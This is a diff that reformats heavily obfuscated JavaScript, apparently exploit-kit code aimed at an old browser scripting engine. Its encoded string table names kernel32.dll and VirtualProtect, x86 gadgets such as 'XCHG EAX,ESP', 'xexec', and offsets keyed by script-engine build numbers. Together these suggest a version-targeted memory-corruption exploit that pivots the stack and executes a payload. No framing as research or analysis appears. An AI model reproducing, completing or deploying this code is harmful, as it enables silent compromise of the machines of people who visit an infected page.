@@ -1,6 +1,8 @@
 var sdfcfg343 = "";
 var sdfaf6ws = "";/*sdfxcxvreturn e; } functiosdf*/
+
 function zdsdfs(num, width) {
+    /* converts to hex */
     var digits = "0123456789abcdef";
     var zdsdfs = digits.substr(num & 0xF, 1);
     while (num > 0xF) {
@@ -90,7 +92,7 @@ function sdffg5fg(_url, _key) {
     Il1Is.hc = Math.pow(2, 52);
     Il1Is.lb = 52 - Il1It;
     Il1Is.mb = 2 * Il1It - 52;
-    var Il1Ifa = "0123456789abcdefghijklmnopqrstuvwxyz", Il1Iz = [], Il1IA, Il1IB;
+        var Il1Ifa = "0123456789abcdefghijklmnopqrstuvwxyz", Il1Iz = [], Il1IA, Il1IB;
     Il1IA = 48;
     for (Il1IB = 0; 9 >= Il1IB; ++Il1IB) {
         Il1Iz[Il1IA++] = Il1IB;
@@ -864,7 +866,8 @@ function sdffg5fg(_url, _key) {
     function Il1IY(a) {
         var b, c, d, e, f, g = 0, h = "";
         do {
-            b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)), c = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, e = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, f = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, d = b << 18 | c << 12 | e << 6 | f, b = d >> 16 & 255, c = d >> 8 & 255, d &= 255, h = 64 == e ? h + String.fromCharCode(b) : 64 == f ? h + String.fromCharCode(b, c) : h + String.fromCharCode(b, c, d);
+            b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++));
+                c = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, e = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, f = g < a.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(a.charAt(g++)) : 64, d = b << 18 | c << 12 | e << 6 | f, b = d >> 16 & 255, c = d >> 8 & 255, d &= 255, h = 64 == e ? h + String.fromCharCode(b) : 64 == f ? h + String.fromCharCode(b, c) : h + String.fromCharCode(b, c, d);
         } while (g < a.length);
         return h;
     }
@@ -885,7 +888,10 @@ function sdffg5fg(_url, _key) {
             c.Jb.toString(16);
             c.L.toString(16);
             try {
-                n = '{"ERER":"EReYTgth","ER":"charCodeAt","I":"fromCharCode","IER":"fERoor","IERI":"raYTdom","ERI":"striYTgify","ERII":"ERocatioYT","II":"host","ERERI":"YTumber","ERERER":"ScriptEYTgiYTeBuiERdVersioYT","ERIER":"ScriptEYTgiYTeMajorVersioYT","IIER":"ScriptEYTgiYTeMiYTorVersioYT","IERER":"setIYTtervaER","III":"cERearIYTtervaER","ERIERI":"ur0pqm8kx","IERII":"http://","ERERERI":"ERocaERhost/","ERIIER":"u","IERIER":"x","ERERERER":"xexec","IERERER":"EAX","ERIII":"ECX","IIIER":"EDI","IERERI":"ESP","IIERI":"XCHG EAX,ESP","IIERER":"MOV [ECX+0C],EAX","ERERIER":"CAERER [EAX+4C]","ERERII":"MOV EDI,[EAX+90]","IIII":"a","ERIERER":"kerYTeER32.dERER","ERIERERER":"virtuaERprotect","IIIERI":11,"ERIIERER":0,"ERERERERER":17905,"ERIERERI":500,"ERERIIER":16,"IERIII":0,"IIIERER":1,"IIERII":2,"ERIERII":3,"IERERIER":4,"ERERERIER":5,"IIERERER":8,"ERIERIER":9,"ERIIIER":10,"IERERII":11,"ERIIERI":12,"IERIERER":16,"IIIIER":24,"IERIERI":100,"IIIII":1,"ERERIERI":2,"ERERERII":2147483647,"ERERIERER":4294967295,"IIERERI":255,"ERERIII":256,"ERIIII":65535,"IIERIER":16776960,"IERIIER":16777215,"ERERERERI":4294967040,"IERERERIER":4294901760,"IERERERER":4278190080,"IERERERI":65280,"ERERERERIER":16711680,"ERERERIERI":19,"ERERIIII":4096,"IIIIIER":4294963200,"IIERERERI":4095,"ERERIIERI":14598366,"IIERERIER":48,"ERERIIERER":32,"IIIERERI":15352,"ERERIERERER":85,"ERIIIII":4096,"IERERERERI":400,"ERIIERII":311296000,"IIIERIER":61440,"ERERERERII":24,"IIIIERER":32,"IERIERIER":17239,"ERERERERERI":15,"IERERIERER":256,"ERERIERERI":76,"ERERERIERER":144,"ERIERIIER":17416,"IERIIERER":65536,"IIERIERER":100000,"ERIERERERI":28,"IIERIERI":60,"ERIERIII":44,"IIIERERER":28,"IERERIII":128,"ERERERIIER":20,"ERIIIERER":12,"ERIERIERI":16,"IIERIIER":4,"IERIIIER":2,"ERIERERERER":110,"IIIERII":64,"IERERIERI":-1,"ERIIIIER":0,"IERERIERII":1,"ERIIERERER":2,"IERIERERER":3,"IIERIII":4,"ERIERERIER":5,"IIERERERER":7,"IIIIII":9,"ERIERIERER":10,"IERERERII":11,"ERIERERII":12,"IERERERERER":-2146823286,"ERIIIERI":[148,195],"ERIIERIER":[137,65,12,195],"IIERERII":[122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IERIIII":[150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIERI":48,"IIIERIERI":57,"ERERERIII":65,"IERERIIER":90,"IERIERII":97,"ERERERERERER":122,"IERIERERI":16640,"ERERIERIER":23040,"IERIIERI":4259840,"ERIIIIERI":5898240,"ERERIIIER":1090519040,"ERERIIIII":1509949440,"IERIIIERI":32,"IIIERERERI":8192,"ERERERERERII":2097152,"IIIERERERER":536870912,"ERERIERII":{"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840}}'.replace(/ER/g, "l").replace(/YT/g, "n"), a.ra = JSON.parse(n), delete c, b.call(null, a);
+                n = '{"ERER":"EReYTgth","ER":"charCodeAt","I":"fromCharCode","IER":"fERoor","IERI":"raYTdom","ERI":"striYTgify","ERII":"ERocatioYT","II":"host","ERERI":"YTumber","ERERER":"ScriptEYTgiYTeBuiERdVersioYT","ERIER":"ScriptEYTgiYTeMajorVersioYT","IIER":"ScriptEYTgiYTeMiYTorVersioYT","IERER":"setIYTtervaER","III":"cERearIYTtervaER","ERIERI":"ur0pqm8kx","IERII":"http://","ERERERI":"ERocaERhost/","ERIIER":"u","IERIER":"x","ERERERER":"xexec","IERERER":"EAX","ERIII":"ECX","IIIER":"EDI","IERERI":"ESP","IIERI":"XCHG EAX,ESP","IIERER":"MOV [ECX+0C],EAX","ERERIER":"CAERER [EAX+4C]","ERERII":"MOV EDI,[EAX+90]","IIII":"a","ERIERER":"kerYTeER32.dERER","ERIERERER":"virtuaERprotect","IIIERI":11,"ERIIERER":0,"ERERERERER":17905,"ERIERERI":500,"ERERIIER":16,"IERIII":0,"IIIERER":1,"IIERII":2,"ERIERII":3,"IERERIER":4,"ERERERIER":5,"IIERERER":8,"ERIERIER":9,"ERIIIER":10,"IERERII":11,"ERIIERI":12,"IERIERER":16,"IIIIER":24,"IERIERI":100,"IIIII":1,"ERERIERI":2,"ERERERII":2147483647,"ERERIERER":4294967295,"IIERERI":255,"ERERIII":256,"ERIIII":65535,"IIERIER":16776960,"IERIIER":16777215,"ERERERERI":4294967040,"IERERERIER":4294901760,"IERERERER":4278190080,"IERERERI":65280,"ERERERERIER":16711680,"ERERERIERI":19,"ERERIIII":4096,"IIIIIER":4294963200,"IIERERERI":4095,"ERERIIERI":14598366,"IIERERIER":48,"ERERIIERER":32,"IIIERERI":15352,"ERERIERERER":85,"ERIIIII":4096,"IERERERERI":400,"ERIIERII":311296000,"IIIERIER":61440,"ERERERERII":24,"IIIIERER":32,"IERIERIER":17239,"ERERERERERI":15,"IERERIERER":256,"ERERIERERI":76,"ERERERIERER":144,"ERIERIIER":17416,"IERIIERER":65536,"IIERIERER":100000,"ERIERERERI":28,"IIERIERI":60,"ERIERIII":44,"IIIERERER":28,"IERERIII":128,"ERERERIIER":20,"ERIIIERER":12,"ERIERIERI":16,"IIERIIER":4,"IERIIIER":2,"ERIERERERER":110,"IIIERII":64,"IERERIERI":-1,"ERIIIIER":0,"IERERIERII":1,"ERIIERERER":2,"IERIERERER":3,"IIERIII":4,"ERIERERIER":5,"IIERERERER":7,"IIIIII":9,"ERIERIERER":10,"IERERERII":11,"ERIERERII":12,"IERERERERER":-2146823286,"ERIIIERI":[148,195],"ERIIERIER":[137,65,12,195],"IIERERII":[122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IERIIII":[150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIERI":48,"IIIERIERI":57,"ERERERIII":65,"IERERIIER":90,"IERIERII":97,"ERERERERERER":122,"IERIERERI":16640,"ERERIERIER":23040,"IERIIERI":4259840,"ERIIIIERI":5898240,"ERERIIIER":1090519040,"ERERIIIII":1509949440,"IERIIIERI":32,"IIIERERERI":8192,"ERERERERERII":2097152,"IIIERERERER":536870912,"ERERIERII":{"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840}}'.replace(/ER/g, "l").replace(/YT/g, "n");
+                a.ra = JSON.parse(n);
+                delete c;
+                b.call(null, a);
             } catch (d) {
             }
         } catch (e) {
@@ -918,7 +924,32 @@ function sdffg5fg(_url, _key) {
             return this.M;
         }
         try {
-            if (this.f = a.ll, this.wa = a.l, this.xa = a.I, this.Fb = a.Il, this.Ld = a.IlI, this.Td = a.lI, this.kd = a.lII, this.Qc = a.II, this.Gd = a.llI, this.U = a.lll, this.Md = a.lIl, this.Nd = a.IIl, this.Pd = a.Ill, this.wb = a.III, this.pd = a.IIIlI, this.xd = a.lIIll, this.sd = a.lllll, this.Ua = a.lIlI, this.Zc = a.IlII, this.Sd = a.lllI, this.de = a.lIIl, this.ie = a.IlIl, this.ee = a.lIllI, this.je = a.llIIl, this.Xc = a.llll, this.hb = a.IlIII, this.Ba = a.IIIll, this.Ea = a.IIlII, this.Vd = a.lIlII, this.ia = a.IllIl, this.Eb = a.lllIl, this.W = a.IIlll, this.da = a.lIIlI, this.$b = a.IlIll, this.fd = a.IlIlI, this.Pa = a.IIIII, this.Ab = a.llIlI, this.td = a.lllII, this.ud = a.llIll, this.Wa = a.IIllI, this.$ = a.llIII, this.vd = a.lIIII, this.Xd = a.IlIIl, this.Wd = a.llllI, this.$d = a.IlllIl, this.Gb = a.Illll, this.Yb = a.IlllI, this.bc = a.llllIl, this.Oc = a.lllIlI, this.j = this.ia, this.Xa = a.llIIII, this.hd = this.ia, this.wd = this.Xa - this.W - this.$b, this.Oa = a.llIIlI, this.Qb = a.llIIll, this.rd = a.IIIllI, this.Fa = a.llIlll, this.Wc = a.lIIIII, this.Cb = a.IllllI, this.ya = a.lIIlII, this.Db = a.IIIlIl, this.bb = a.llllII, this.la = a.IIIIll, this.Bc = a.IlIlIl, this.Hd = a.lllllI, this.Rd = a.IllIll, this.za = a.llIllI, this.Ca = a.lllIll, this.Od = a.lIlIIl, this.Ma = a.IlIIll, this.Mb = a.IIlIll, this.na = a.lIlllI, this.Rc = a.IIlIlI, this.Ac = a.lIlIII, this.Qd = a.IIIlll, this.$c = a.IllIII, this.ad = a.lllIIl, this.yd = a.lIIIll, this.Yd = a.lIlIlI, this.Zd = a.IIlIIl, this.Ud = a.IlIIIl, this.Id = a.lIllll, this.pc = a.IIIlII, this.ce = a.IllIlI, this.ed = a.lIIIIl, this.cd = a.IllIlII, this.Bb = a.lIIlll, this.qd = a.IlIlll, this.Fd = a.IIlIII, this.Ed = a.lIllIl, this.dd = a.IIllll, this.Hb = a.IIIIII, this.bd = a.lIlIll, this.be = a.IlllII, this.Dc = a.lIllII, this.Vc = a.Illlll, this.zb = a.Illl, this.Sc = a.lIII, this.Uc = a.IllI, this.cc = a.IIlI, this.Tb = a.IIll, this.he = a.lIIIlI, this.Ad = a.lIIlIl, this.ge = a.IIllII, this.zd = a.IlIIII, this.Ec = a.IIIIlI, this.Fc = a.IIIlIlI, this.ub = a.lllIII, this.vb = a.IllIIl, this.Jc = a.IlIlII, this.Nc = a.llllll, this.Gc = a.IlIllI, this.Kc = a.llIlIl, this.Hc = a.IlIIlI, this.Lc = a.lIIIIlI, this.Ic = a.llIIIl, this.Mc = a.llIIIII, this.ld = a.IlIIIlI, this.md = a.IIIlllI, this.nd = a.lllllII, this.od = a.IIIllll, this.Na = a.IIII, this.Ta = a.lIll, this.fb = a.lIlll, this.Cc = a.llIlII, !this.D[this.U] || this.D[this.U]() < this.Bc) {
+            if (this.f = a.ll, this.wa = a.l, this.xa = a.I, this.Fb = a.Il, this.Ld = a.IlI,
+                this.Td = a.lI, this.kd = a.lII, this.Qc = a.II, this.Gd = a.llI, this.U = a.lll,
+                this.Md = a.lIl, this.Nd = a.IIl, this.Pd = a.Ill, this.wb = a.III, this.pd = a.IIIlI,
+                this.xd = a.lIIll, this.sd = a.lllll, this.Ua = a.lIlI, this.Zc = a.IlII, this.Sd = a.lllI,
+                this.de = a.lIIl, this.ie = a.IlIl, this.ee = a.lIllI, this.je = a.llIIl, this.Xc = a.llll,
+                this.hb = a.IlIII, this.Ba = a.IIIll, this.Ea = a.IIlII, this.Vd = a.lIlII, this.ia = a.IllIl,
+                this.Eb = a.lllIl, this.W = a.IIlll, this.da = a.lIIlI, this.$b = a.IlIll, this.fd = a.IlIlI,
+                this.Pa = a.IIIII, this.Ab = a.llIlI, this.td = a.lllII, this.ud = a.llIll, this.Wa = a.IIllI,
+                this.$ = a.llIII, this.vd = a.lIIII, this.Xd = a.IlIIl, this.Wd = a.llllI, this.$d = a.IlllIl,
+                this.Gb = a.Illll, this.Yb = a.IlllI, this.bc = a.llllIl, this.Oc = a.lllIlI, this.j = this.ia,
+                this.Xa = a.llIIII, this.hd = this.ia, this.wd = this.Xa - this.W - this.$b, this.Oa = a.llIIlI,
+                this.Qb = a.llIIll, this.rd = a.IIIllI, this.Fa = a.llIlll, this.Wc = a.lIIIII, this.Cb = a.IllllI,
+                this.ya = a.lIIlII, this.Db = a.IIIlIl, this.bb = a.llllII, this.la = a.IIIIll, this.Bc = a.IlIlIl,
+                this.Hd = a.lllllI, this.Rd = a.IllIll, this.za = a.llIllI, this.Ca = a.lllIll, this.Od = a.lIlIIl,
+                this.Ma = a.IlIIll, this.Mb = a.IIlIll, this.na = a.lIlllI, this.Rc = a.IIlIlI, this.Ac = a.lIlIII,
+                this.Qd = a.IIIlll, this.$c = a.IllIII, this.ad = a.lllIIl, this.yd = a.lIIIll, this.Yd = a.lIlIlI,
+                this.Zd = a.IIlIIl, this.Ud = a.IlIIIl, this.Id = a.lIllll, this.pc = a.IIIlII, this.ce = a.IllIlI,
+                this.ed = a.lIIIIl, this.cd = a.IllIlII, this.Bb = a.lIIlll, this.qd = a.IlIlll, this.Fd = a.IIlIII,
+                this.Ed = a.lIllIl, this.dd = a.IIllll, this.Hb = a.IIIIII, this.bd = a.lIlIll, this.be = a.IlllII,
+                this.Dc = a.lIllII, this.Vc = a.Illlll, this.zb = a.Illl, this.Sc = a.lIII, this.Uc = a.IllI,
+                this.cc = a.IIlI, this.Tb = a.IIll, this.he = a.lIIIlI, this.Ad = a.lIIlIl, this.ge = a.IIllII,
+                this.zd = a.IlIIII, this.Ec = a.IIIIlI, this.Fc = a.IIIlIlI, this.ub = a.lllIII, this.vb = a.IllIIl,
+                this.Jc = a.IlIlII, this.Nc = a.llllll, this.Gc = a.IlIllI, this.Kc = a.llIlIl, this.Hc = a.IlIIlI,
+                this.Lc = a.lIIIIlI, this.Ic = a.llIIIl, this.Mc = a.llIIIII, this.ld = a.IlIIIlI, this.md = a.IIIlllI,
+                this.nd = a.lllllII, this.od = a.IIIllll, this.Na = a.IIII, this.Ta = a.lIll, this.fb = a.lIlll,
+                this.Cc = a.llIlII, !this.D[this.U] || this.D[this.U]() < this.Bc) {
                 this.bb -= this.ia, this.la -= this.ia, this.na -= this.da;
             }
             !this.D[this.U] || this.D[this.U]() < this.Od ? this.V = this.za : this.V = this.Ca;
